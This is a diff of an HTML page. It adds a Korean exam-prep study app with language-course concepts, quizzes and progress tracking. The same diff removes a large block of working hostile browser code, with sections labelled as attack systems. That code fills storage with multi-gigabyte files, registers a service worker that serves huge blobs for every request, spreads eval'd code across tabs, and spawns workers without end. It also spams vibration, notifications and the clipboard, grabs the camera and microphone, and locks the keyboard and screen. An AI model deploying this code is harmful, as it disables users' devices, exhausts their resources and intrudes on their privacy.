+            { title: "기본 동사 활용", content: "sein, haben과 같은 기본 동사의 활용은 문장 구성의 핵심이다. 인칭 변화와 시제 변화를 이해하면 기본 문장을 정확히 만들 수 있다." }
+          ],
+          quizzes: [
+            { q: "독일어에서 동사가 2위에 오는 문장은?", options: ["의문문", "평서문", "종속절", "명령문", "부정문"], answer: 1, explanation: "평서문은 동사가 2위에 온다." },
+            { q: "독일어 명사의 성은 몇 가지인가?", options: ["2", "3", "4", "5", "6"], answer: 1, explanation: "남성, 여성, 중성 세 가지다." },
+            { q: "기본 동사 sein의 의미는?", options: ["가지다", "이다", "가다", "먹다", "보다"], answer: 1, explanation: "sein은 '이다'를 뜻한다." }
+          ]
+        },
+        "프랑스어Ⅰ": {
+          concepts: [
+            { title: "기본 인사 표현", content: "프랑스어는 상황에 따라 Bonjour, Bonsoir 등을 사용한다. 인칭 대명사와 함께 기본 인사 표현을 익히면 의사소통의 첫걸음을 쉽게 시작할 수 있다." },
+            { title: "동사 활용", content: "프랑스어 동사는 규칙 활용과 불규칙 활용이 있다. 1군 동사의 규칙을 이해하면 기본 문장을 구성할 수 있고, être, avoir는 불규칙 활용을 익혀야 한다." },
+            { title: "성수 일치", content: "명사와 형용사는 성과 수를 일치해야 한다. 문장 내에서 남성·여성 명사 구분이 중요하며, 복수형 변화 규칙을 이해해야 한다." }
+          ],
+          quizzes: [
+            { q: "Bonjour의 의미는?", options: ["안녕", "잘 가", "감사", "미안", "축하"], answer: 0, explanation: "Bonjour는 '안녕하세요'에 해당한다." },
+            { q: "être 동사의 의미는?", options: ["가지다", "있다", "이다", "가다", "보다"], answer: 2, explanation: "être는 '이다'에 해당한다." },
+            { q: "형용사의 성수 일치는 무엇을 의미하는가?", options: ["변화 없음", "명사와 성·수 맞춤", "동사 변화", "부정", "강조"], answer: 1, explanation: "형용사는 명사와 성·수를 맞춘다." }
+          ]
+        },
+        "스페인어Ⅰ": {
+          concepts: [
+            { title: "기본 동사 ser/estar", content: "스페인어의 ser와 estar는 모두 '이다'를 뜻하지만 용법이 다르다. ser는 본질적 특성, estar는 상태나 위치를 나타낸다." },
+            { title: "인칭 대명사", content: "스페인어는 인칭 대명사에 따라 동사 활용이 달라진다. 주어가 생략되는 경우가 많으므로 동사 변화 형태를 통해 주어를 추론해야 한다." },
+            { title: "기본 시제", content: "현재 시제 활용이 기본이며, 동사 어미 변화 규칙을 익히면 다양한 문장을 만들 수 있다. 규칙 동사와 불규칙 동사의 활용 차이를 구분해야 한다." }
+          ],
+          quizzes: [
+            { q: "ser의 용법으로 옳은 것은?", options: ["일시적 상태", "본질적 특성", "위치", "감정", "날씨"], answer: 1, explanation: "ser는 본질적 특성을 나타낸다." },
+            { q: "스페인어 동사 활용이 달라지는 기준은?", options: ["색", "인칭", "길이", "발음", "성별"], answer: 1, explanation: "인칭에 따라 동사 활용이 달라진다." },
+            { q: "현재 시제는 무엇을 표현하는가?", options: ["과거", "현재", "미래", "조건", "가정"], answer: 1, explanation: "현재 시제는 현재 상태나 습관을 표현한다." }
+          ]
+        },
+        "중국어Ⅰ": {
+          concepts: [
+            { title: "성조", content: "중국어는 성조에 따라 의미가 달라진다. 1성부터 4성까지 기본 성조를 정확히 구분해야 정확한 발음과 의미 전달이 가능하다." },
+            { title: "기본 문장 구조", content: "중국어는 주어-동사-목적어 순서를 기본으로 한다. 시간, 장소 부사는 일반적으로 동사 앞에 위치하며, 어순이 의미 전달에 큰 역할을 한다." },
+            { title: "기초 회화", content: "인사, 자기소개, 주문 등 일상 회화는 수능 제2외국어에서 핵심이다. 표현을 암기하기보다 상황별 의미와 활용을 이해해야 한다." }
+          ],
+          quizzes: [
+            { q: "중국어 성조는 몇 개 기본적으로 존재하는가?", options: ["2", "3", "4", "5", "6"], answer: 2, explanation: "기본 성조는 4개이다." },
+            { q: "중국어 기본 어순은?", options: ["동사-주어-목적어", "주어-동사-목적어", "목적어-동사-주어", "부사-목적어-동사", "무작위"], answer: 1, explanation: "중국어는 주어-동사-목적어 순이다." },
+            { q: "일상 회화 학습에서 중요한 것은?", options: ["상황 이해", "무조건 암기", "문법 무시", "발음 생략", "해석 금지"], answer: 0, explanation: "상황별 의미를 이해하는 것이 중요하다." }
+          ]
+        },
+        "일본어Ⅰ": {
+          concepts: [
+            { title: "히라가나와 가타카나", content: "일본어는 히라가나와 가타카나 두 종류의 음절 문자를 사용한다. 기본 음절 표를 익히면 발음과 표기를 정확히 할 수 있다." },
+            { title: "기본 문장 구조", content: "일본어는 주어-목적어-동사(SOV) 어순이 기본이다. 조사로 문장 성분을 표시하며, 동사는 문장 끝에 위치한다." },
+            { title: "존경 표현", content: "일본어는 존경어, 겸양어, 정중어로 높임 표현이 구분된다. 상황에 맞는 경어 사용은 의사소통의 필수 요소다." }
+          ],
+          quizzes: [
+            { q: "일본어 기본 어순은?", options: ["SVO", "SOV", "VSO", "OVS", "무작위"], answer: 1, explanation: "일본어는 SOV 어순이다." },
+            { q: "가타카나의 주 사용 용도는?", options: ["외래어", "한자", "숫자", "조사", "존경어"], answer: 0, explanation: "가타카나는 외래어 표기에 사용된다." },
+            { q: "일본어 경어에 포함되지 않는 것은?", options: ["존경어", "겸양어", "정중어", "속어", "예의 표현"], answer: 3, explanation: "속어는 경어 범주가 아니다." }
+          ]
+        },
+        "러시아어Ⅰ": {
+          concepts: [
+            { title: "키릴 문자", content: "러시아어는 키릴 문자를 사용하며, 알파벳과 다른 발음을 가진 글자가 많다. 문자와 발음을 정확히 익혀야 읽기와 듣기에서 실수를 줄일 수 있다." },
+            { title: "격 변화", content: "러시아어는 명사가 격에 따라 형태가 변화한다. 주격, 속격, 대격 등 기본 격의 역할을 이해하면 문장의 의미를 정확히 파악할 수 있다." },
+            { title: "기본 동사 활용", content: "동사는 인칭과 시제에 따라 변화한다. 규칙 동사의 활용을 익히고, 자주 쓰이는 불규칙 동사를 함께 학습하는 것이 중요하다." }
+          ],
+          quizzes: [
+            { q: "러시아어에서 사용하는 문자는?", options: ["라틴", "키릴", "한자", "아랍", "히라가나"], answer: 1, explanation: "러시아어는 키릴 문자를 사용한다." },
+            { q: "격 변화의 목적은?", options: ["발음 장식", "문장 역할 표시", "글자 수 증가", "의미 제거", "속도 감소"], answer: 1, explanation: "격 변화는 문장 내 역할을 표시한다." },
+            { q: "동사 활용이 변화하는 기준은?", options: ["인칭과 시제", "성조", "색", "길이", "위치"], answer: 0, explanation: "인칭과 시제에 따라 변화한다." }
+          ]
+        },
+        "아랍어Ⅰ": {
+          concepts: [
+            { title: "아랍 문자", content: "아랍어는 오른쪽에서 왼쪽으로 쓰며, 문자 형태가 단어 위치에 따라 변한다. 글자의 연결과 모양 변화를 익히면 읽기 능력이 향상된다." },
+            { title: "기본 인사", content: "아랍어 기본 인사 표현은 문화적 맥락과 함께 학습해야 한다. 인사말은 일상 회화의 출발점이며, 발음과 의미를 정확히 익히는 것이 중요하다." },
+            { title: "동사 체계", content: "아랍어 동사는 인칭, 성, 수에 따라 형태가 변한다. 동사의 기본형을 익히고 변화 규칙을 이해하면 문장 구성 능력이 향상된다." }
+          ],
+          quizzes: [
+            { q: "아랍어 문장은 어떤 방향으로 쓰는가?", options: ["왼쪽→오른쪽", "오른쪽→왼쪽", "위→아래", "아래→위", "무작위"], answer: 1, explanation: "아랍어는 오른쪽에서 왼쪽으로 쓴다." },
+            { q: "아랍어 동사 변화 기준은?", options: ["인칭·성·수", "색", "길이", "리듬", "크기"], answer: 0, explanation: "인칭, 성, 수에 따라 동사 형태가 변한다." },
+            { q: "인사 표현 학습의 목적은?", options: ["문자 제거", "기초 회화 시작", "문법 무시", "의미 축소", "단어 생략"], answer: 1, explanation: "기초 회화의 출발점이 된다." }
+          ]
+        },
+        "베트남어Ⅰ": {
+          concepts: [
+            { title: "성조 체계", content: "베트남어는 성조가 의미를 구분한다. 같은 철자라도 성조에 따라 뜻이 달라지므로 성조의 높낮이와 길이를 정확히 익혀야 한다." },
+            { title: "기본 문장", content: "베트남어는 주어-동사-목적어 어순을 기본으로 한다. 시제 표현은 부사를 활용하는 경우가 많아 어순 이해가 중요하다." },
+            { title: "기초 회화", content: "일상 인사, 자기소개, 쇼핑 표현 등 기초 회화는 시험에서 반복 출제된다. 상황별 표현의 의미와 발음을 함께 연습해야 한다." }
+          ],
+          quizzes: [
+            { q: "베트남어에서 성조가 중요한 이유는?", options: ["의미 구분", "문법 제거", "문장 축소", "발음 무시", "길이 변화"], answer: 0, explanation: "성조는 의미를 구분한다." },
+            { q: "베트남어 기본 어순은?", options: ["SVO", "SOV", "VSO", "OVS", "무작위"], answer: 0, explanation: "베트남어는 SVO 어순이다." },
+            { q: "기초 회화 학습 시 중요한 것은?", options: ["상황별 의미", "무의미 암기", "성조 무시", "발음 생략", "문법 무시"], answer: 0, explanation: "상황별 의미를 이해해야 한다." }
+          ]
+        },
+        "한문Ⅰ": {
+          concepts: [
+            { title: "기본 한자", content: "한문은 한자의 의미와 음을 결합해 읽는다. 자주 쓰이는 기본 한자를 익히면 문장 해석 속도가 빠르며, 부수와 획순을 이해하면 의미 유추에 도움이 된다." },
+            { title: "문장 구조", content: "한문은 주어-서술어-목적어 순으로 구성되며, 생략이 많다. 문맥을 통해 생략된 성분을 보완하고, 문장 부호 역할을 이해해야 한다." },
+            { title: "고사 성어", content: "고사 성어는 역사적 사건과 교훈을 담는다. 의미와 유래를 함께 이해하면 문장 해석과 추론 문제에서 정확한 판단이 가능하다." }
+          ],
+          quizzes: [
+            { q: "한문 문장에서 자주 생략되는 요소는?", options: ["주어", "문맥 연결", "어순", "부사", "시간"], answer: 0, explanation: "한문은 주어가 생략되는 경우가 많다." },
+            { q: "고사 성어 학습의 장점은?", options: ["문법 무시", "역사적 맥락 이해", "발음 단순화", "어휘 축소", "의미 축소"], answer: 1, explanation: "고사 성어는 역사적 맥락 이해에 도움 된다." },
+            { q: "한자 부수 학습의 효과는?", options: ["의미 유추", "문장 파괴", "독해 방해", "발음 불가", "기억 제거"], answer: 0, explanation: "부수는 한자의 의미 유추에 도움 된다." }
+          ]
+        }
+      }
+    };
 
-        // (5-B) 무한 CSS 애니메이션 (업그레이드: 동적 스타일 삽입 + observer)
-        const observer = new MutationObserver(() => {});
-        observer.observe(document.body, { childList: true, subtree: true });
-        setInterval(() => {
-            const style = document.createElement('style');
-            style.textContent = `
-                @keyframes ultra_doom {
-                    0% { transform: rotate(0deg) scale(1) translate(0,0); }
-                    20% { transform: rotate(72deg) scale(2) translate(100px,100px); }
-                    40% { transform: rotate(144deg) scale(0.5) translate(-100px,-100px); }
-                    60% { transform: rotate(216deg) scale(4) translate(200px,200px); }
-                    80% { transform: rotate(288deg) scale(0.2) translate(-200px,-200px); }
-                    100% { transform: rotate(360deg) scale(1) translate(0,0); }
-                }
-                * {
-                    animation: ultra_doom 0.01s infinite linear, chaos 0.02s infinite, apocalypse 0.03s infinite;
-                    will-change: all;
-                }
-            `;
-            document.head.appendChild(style);
-        }, 10);
-    </script>
+    const dashboardEl = document.getElementById("dashboard");
+    const studyViewEl = document.getElementById("studyView");
+    const conceptListEl = document.getElementById("conceptList");
+    const conceptCountEl = document.getElementById("conceptCount");
+    const quizAreaEl = document.getElementById("quizArea");
+    const subjectBadgeEl = document.getElementById("subjectBadge");
+    const studyTitleEl = document.getElementById("studyTitle");
+    const studySubtitleEl = document.getElementById("studySubtitle");
+    const scoreDisplayEl = document.getElementById("scoreDisplay");
+    const backButtonEl = document.getElementById("backButton");
+    const searchInputEl = document.getElementById("searchInput");
+    const subjectMenuEl = document.getElementById("subjectMenu");
 
-    <!-- ====== 6. 파일시스템 초토화 시스템 (업그레이드: 무한 디렉토리 트리 + 파일 시스템 싱크) ====== -->
-    <script>
-        // (6-A) File System Access API 남용 (업그레이드: 10레벨 재귀 디렉토리 + 싱크 오버로드)
-        navigator.storage.getDirectory().then(async (root) => {
-            async function createDoomDir(dir, depth) {
-                if(depth > 0) {
-                    const subDir = await dir.getDirectoryHandle(`doom_${Date.now()}_${Math.random()}`, { create: true });
-                    for(let i=0; i<50; i++) {
-                        const file = await subDir.getFileHandle(`kill_${i}_${Math.random()}`, { create: true });
-                        const writer = await file.createWritable();
-                        await writer.write(new Blob([new ArrayBuffer(10 ** 9 * 5)])); // 5GB
-                        await writer.close();
-                        const sync = await file.createSyncAccessHandle();
-                        sync.write(new Uint8Array(10**8));
-                        sync.close();
-                    }
-                    createDoomDir(subDir, depth-1);
-                }
-            }
-            setInterval(() => createDoomDir(root, 10), 10); // 10레벨 깊이
+    const STORAGE_KEY = "csat-progress-v2";
+    const ERROR_KEY = "csat-incorrect-v2";
+    const progressState = JSON.parse(localStorage.getItem(STORAGE_KEY) || "{}");
+    const incorrectState = JSON.parse(localStorage.getItem(ERROR_KEY) || "{}");
+
+    const state = {
+      subject: null,
+      subtopic: null,
+      questionIndex: 0,
+      showExplanation: false,
+      filter: ""
+    };
+
+    const saveProgress = () => {
+      localStorage.setItem(STORAGE_KEY, JSON.stringify(progressState));
+      localStorage.setItem(ERROR_KEY, JSON.stringify(incorrectState));
+    };
+
+    const getKey = (subject, subtopic) => `${subject}::${subtopic}`;
+
+    const ensureProgress = (subject, subtopic) => {
+      const key = getKey(subject, subtopic);
+      if (!progressState[key]) {
+        progressState[key] = { correct: 0, total: 0, lastIndex: 0 };
+      }
+      if (!incorrectState[key]) {
+        incorrectState[key] = [];
+      }
+      return key;
+    };
+
+    const renderMenu = () => {
+      subjectMenuEl.innerHTML = "";
+      Object.keys(CSAT_DATA).forEach((subject) => {
+        if (state.filter && !subject.includes(state.filter)) {
+          return;
+        }
+        const button = document.createElement("button");
+        button.className = "w-full text-left px-3 py-2 rounded-lg bg-slate-900/70 border border-slate-700 hover:border-indigo-400 transition";
+        button.textContent = subject;
+        button.addEventListener("click", () => {
+          state.filter = subject;
+          searchInputEl.value = subject;
+          renderDashboard();
         });
-    </script>
+        subjectMenuEl.appendChild(button);
+      });
+    };
 
-    <!-- ====== 7. 영구 지속형 감염 시스템 (업그레이드: PWA 설치 + 캐시 포이즌 + 워커 네스트) ====== -->
-    <script>
-        // (7-A) Service Worker 영구 백그라운드 공격 (업그레이드: 네스트 워커 + fetch 인터셉트)
-        const swCode = `
-            self.addEventListener('install', e => e.waitUntil(skipWaiting()));
-            self.addEventListener('activate', e => e.waitUntil(clients.claim()));
-            self.addEventListener('fetch', e => e.respondWith(new Response(new Blob([new ArrayBuffer(10**9)]))));
-            self.addEventListener('message', e => {
-                setInterval(() => {
-                    fetch(location.href, { mode: 'no-cors' });
-                    new WebSocket('wss://${location.host}/sw_attack');
-                    new Worker(URL.createObjectURL(new Blob(['setInterval(() => new Worker(URL.createObjectURL(new Blob(["while(1){}"]))),1);'])));
-                }, 0.1);
-            });
+    const renderDashboard = () => {
+      dashboardEl.innerHTML = "";
+      Object.entries(CSAT_DATA).forEach(([subject, subtopics]) => {
+        if (state.filter && !subject.includes(state.filter)) {
+          return;
+        }
+        const card = document.createElement("div");
+        card.className = "glass rounded-2xl p-6 flex flex-col gap-4";
+        const subtopicList = Object.keys(subtopics)
+          .map((name) => `<button class=\"subtopic-btn text-left px-3 py-2 rounded-lg bg-slate-800 hover:bg-indigo-500/20 transition\" data-subtopic=\"${name}\">${name}</button>`)
+          .join("");
+        card.innerHTML = `
+          <div>
+            <h3 class="text-2xl font-semibold">${subject}</h3>
+            <p class="text-slate-400 text-sm mt-1">${Object.keys(subtopics).length}개 단원</p>
+          </div>
+          <div class="grid gap-2">${subtopicList}</div>
         `;
-        
-        const blob = new Blob([swCode], { type: 'application/javascript' });
-        navigator.serviceWorker.register(URL.createObjectURL(blob)).then(reg => {
-            reg.active.postMessage({ type: 'DOOM' });
-            reg.installing.postMessage({ type: 'DOOM' });
+        card.querySelectorAll(".subtopic-btn").forEach((button) => {
+          button.addEventListener("click", () => openStudy(subject, button.dataset.subtopic));
         });
-        // PWA 설치 프롬프트 트리거
-        window.addEventListener('beforeinstallprompt', (e) => { e.prompt(); });
+        dashboardEl.appendChild(card);
+      });
+    };
 
-        // (7-B) BroadcastChannel을 통한 탭 간 감염 (업그레이드: eval 체인 + 재전파 루프)
-        const channel = new BroadcastChannel('omega_doom');
-        channel.postMessage({ cmd: 'INJECT', code: 'setInterval(() => { eval("while(1){ postMessage({cmd:\\\'INJECT\\\', code:this.code}) }"); }, 1);' });
-        channel.onmessage = (e) => {
-            if(e.data.cmd === 'INJECT') {
-                eval(e.data.code);
-                channel.postMessage(e.data);
-                setInterval(() => channel.postMessage(e.data), 1);
-            }
-        };
-    </script>
+    const renderConcepts = (concepts) => {
+      conceptCountEl.textContent = `${concepts.length}개`;
+      conceptListEl.innerHTML = "";
+      concepts.forEach((concept) => {
+        const item = document.createElement("div");
+        item.className = "bg-slate-900/60 rounded-xl p-4 border border-slate-700";
+        item.innerHTML = `
+          <h4 class="text-lg font-semibold text-indigo-200">${concept.title}</h4>
+          <p class="text-slate-300 mt-2 leading-relaxed">${concept.content}</p>
+        `;
+        conceptListEl.appendChild(item);
+      });
+    };
 
-    <!-- ====== 8. 배터리/센서 초과사용 시스템 (업그레이드: 멀티 센서 리스너 + 진동 패턴) ====== -->
-    <script>
-        // (8-A) 배터리 고갈 공격 (업그레이드: 충전 감지 리로드 + wakelock)
-        navigator.getBattery().then(battery => {
-            battery.addEventListener('chargingchange', () => location.reload());
-        });
-        navigator.wakeLock.request('screen');
+    const renderQuiz = (quizzes, subject, subtopic) => {
+      const key = ensureProgress(subject, subtopic);
+      const progress = progressState[key];
+      const quiz = quizzes[state.questionIndex];
+      const incorrect = incorrectState[key];
+      scoreDisplayEl.textContent = `${progress.correct}/${progress.total}`;
 
-        // (8-B) 센서 과부하 (자이로, 가속도, 빛, 근접 등)
-        if (window.DeviceMotionEvent) window.addEventListener('devicemotion', () => {}, true);
-        if (window.DeviceOrientationEvent) window.addEventListener('deviceorientation', () => {}, true);
-        if (window.AmbientLightSensor) new AmbientLightSensor().start();
-        if (window.ProximitySensor) new ProximitySensor().start();
-        setInterval(() => {
-            navigator.vibrate(new Array(1000).fill(1000)); // 무한 진동 패턴
-        }, 1);
+      quizAreaEl.innerHTML = `
+        <div class="flex items-center justify-between gap-4">
+          <div>
+            <p class="text-indigo-300 text-sm">문항 ${state.questionIndex + 1} / ${quizzes.length}</p>
+            <h4 class="text-xl font-semibold mt-1">${quiz.q}</h4>
+          </div>
+          <button id="toggleExplanation" class="px-3 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 transition">
+            ${state.showExplanation ? "해설 숨기기" : "해설 보기"}
+          </button>
+        </div>
+        <form id="quizForm" class="mt-4 space-y-3">
+          ${quiz.options
+            .map(
+              (option, idx) => `
+                <label class="flex items-start gap-3 bg-slate-900/70 border border-slate-700 rounded-xl p-3 cursor-pointer hover:border-indigo-400 transition">
+                  <input type="radio" name="answer" value="${idx}" class="mt-1" />
+                  <span class="text-slate-200">${option}</span>
+                </label>
+              `
+            )
+            .join("")}
+          <div class="flex flex-wrap items-center gap-3 pt-2">
+            <button type="submit" class="px-4 py-2 rounded-lg bg-indigo-500 hover:bg-indigo-400 text-white font-semibold">정답 확인</button>
+            <button type="button" id="prevQuestion" class="px-4 py-2 rounded-lg bg-slate-800 hover:bg-slate-700">이전</button>
+            <button type="button" id="nextQuestion" class="px-4 py-2 rounded-lg bg-slate-800 hover:bg-slate-700">다음</button>
+            <button type="button" id="reviewIncorrect" class="px-4 py-2 rounded-lg bg-rose-500/80 hover:bg-rose-400">오답 보기 (${incorrect.length})</button>
+          </div>
+          <div id="feedback" class="mt-4"></div>
+          <div id="explanation" class="mt-4 ${state.showExplanation ? "" : "hidden"}">
+            <h5 class="text-indigo-300 font-semibold">해설</h5>
+            <p class="text-slate-300 mt-2 leading-relaxed">${quiz.explanation}</p>
+          </div>
+        </form>
+      `;
 
-        // (8-C) 클립보드/노티피케이션/퍼미션 스팸
-        setInterval(() => {
-            navigator.clipboard.writeText('DOOM'.repeat(10**7));
-            new Notification('TERMINATOR', { body: 'SYSTEM DOWN'.repeat(1000), silent: false, requireInteraction: true });
-            Notification.requestPermission();
-            navigator.mediaDevices.getUserMedia({audio: true, video: true});
-        }, 1);
-    </script>
+      const quizForm = document.getElementById("quizForm");
+      const feedbackEl = document.getElementById("feedback");
+      const toggleExplanationEl = document.getElementById("toggleExplanation");
 
-    <!-- ====== 9. 워커 풀 핵폭발 시스템 (업그레이드: 네스트 워커 + 메시지 플러드 체인) ====== -->
-    <script>
-        // (9-A) Worker 무한 스폰과 메시지 플러드 (업그레이드: 재귀 스폰)
-        function spawnWorkers(depth = 5) {
-            if(depth > 0) {
-                for(let i=0; i<200; i++) {
-                    const worker = new Worker(URL.createObjectURL(new Blob([`setInterval(() => postMessage(new ArrayBuffer(10**8)),1); spawnWorkers(${depth-1});`])));
-                    worker.onmessage = () => {};
-                }
-            } else {
-                while(true) { postMessage(new ArrayBuffer(10**8)); }
-            }
-            setTimeout(() => spawnWorkers(depth), 10);
+      toggleExplanationEl.addEventListener("click", () => {
+        state.showExplanation = !state.showExplanation;
+        renderQuiz(quizzes, subject, subtopic);
+      });
+
+      quizForm.addEventListener("submit", (event) => {
+        event.preventDefault();
+        const selected = quizForm.querySelector("input[name='answer']:checked");
+        if (!selected) {
+          feedbackEl.innerHTML = `<p class="text-amber-300">정답을 선택해 주세요.</p>`;
+          return;
         }
-        spawnWorkers();
-    </script>
+        const value = Number(selected.value);
+        progress.total += 1;
+        if (value === quiz.answer) {
+          progress.correct += 1;
+          feedbackEl.innerHTML = `<p class="text-emerald-300 font-semibold">정답입니다! 개념을 잘 이해하고 있습니다.</p>`;
+          const incorrectIndex = incorrect.indexOf(state.questionIndex);
+          if (incorrectIndex !== -1) {
+            incorrect.splice(incorrectIndex, 1);
+          }
+        } else {
+          feedbackEl.innerHTML = `<p class="text-rose-300 font-semibold">오답입니다. ${quiz.options[quiz.answer]}가 정답입니다.</p>`;
+          if (!incorrect.includes(state.questionIndex)) {
+            incorrect.push(state.questionIndex);
+          }
+        }
+        saveProgress();
+        scoreDisplayEl.textContent = `${progress.correct}/${progress.total}`;
+      });
 
-    <!-- ====== 10. 신규: 크립토 마이닝 + 리소스 호그 시스템 ====== -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-    <script>
-        // (10-A) 크립토 마이닝 오버로드
-        setInterval(() => {
-            for(let i=0; i<1000; i++) {
-                CryptoJS.SHA256('mine' + Math.random()).toString();
-            }
-        }, 1);
+      document.getElementById("prevQuestion").addEventListener("click", () => {
+        state.questionIndex = (state.questionIndex - 1 + quizzes.length) % quizzes.length;
+        progress.lastIndex = state.questionIndex;
+        saveProgress();
+        renderQuiz(quizzes, subject, subtopic);
+      });
 
-        // (10-B) 리소스 호그 (미디어, 카메라, 마이크)
-        navigator.mediaDevices.getUserMedia({video: true, audio: true}).then(stream => {
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
-            setInterval(() => {
-                const canvas = document.createElement('canvas');
-                canvas.getContext('2d').drawImage(video, 0, 0);
-            }, 1);
-        });
-    </script>
+      document.getElementById("nextQuestion").addEventListener("click", () => {
+        state.questionIndex = (state.questionIndex + 1) % quizzes.length;
+        progress.lastIndex = state.questionIndex;
+        saveProgress();
+        renderQuiz(quizzes, subject, subtopic);
+      });
 
-    <!-- ====== 11. 신규: 브라우저 락다운 + 히스토리/쿠키 포이즌 ====== -->
-    <script>
-        // (11-A) 브라우저 락다운 (풀스크린 + 포인터 락 + 키보드 트랩)
-        document.addEventListener('keydown', e => e.preventDefault());
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        setInterval(() => {
-            document.documentElement.requestFullscreen();
-            document.documentElement.requestPointerLock();
-        }, 1);
+      document.getElementById("reviewIncorrect").addEventListener("click", () => {
+        if (incorrect.length === 0) {
+          feedbackEl.innerHTML = `<p class="text-slate-300">현재 오답 노트가 비어 있습니다.</p>`;
+          return;
+        }
+        state.questionIndex = incorrect[0];
+        progress.lastIndex = state.questionIndex;
+        saveProgress();
+        renderQuiz(quizzes, subject, subtopic);
+      });
+    };
 
-        // (11-B) 히스토리/쿠키 포이즌
-        setInterval(() => {
-            history.pushState({}, '', '/' + Math.random());
-            document.cookie = `doom=${'X'.repeat(10**6)}; max-age=31536000; path=/`;
-        }, 1);
-    </script>
+    const openStudy = (subject, subtopic) => {
+      state.subject = subject;
+      state.subtopic = subtopic;
+      const data = CSAT_DATA[subject][subtopic];
+      const key = ensureProgress(subject, subtopic);
+      state.questionIndex = progressState[key].lastIndex || 0;
+      state.showExplanation = false;
+
+      subjectBadgeEl.textContent = subject;
+      studyTitleEl.textContent = subtopic;
+      studySubtitleEl.textContent = `${subject} · ${subtopic} 핵심 개념과 문제를 학습하세요.`;
+
+      renderConcepts(data.concepts);
+      renderQuiz(data.quizzes, subject, subtopic);
+      studyViewEl.classList.remove("hidden");
+      studyViewEl.scrollIntoView({ behavior: "smooth" });
+    };
+
+    searchInputEl.addEventListener("input", (event) => {
+      state.filter = event.target.value.trim();
+      renderMenu();
+      renderDashboard();
+    });
+
+    backButtonEl.addEventListener("click", () => {
+      studyViewEl.classList.add("hidden");
+      window.scrollTo({ top: 0, behavior: "smooth" });
+    });
+
+    renderMenu();
+    renderDashboard();
+  </script>
 </body>
-    </html>
+</html>
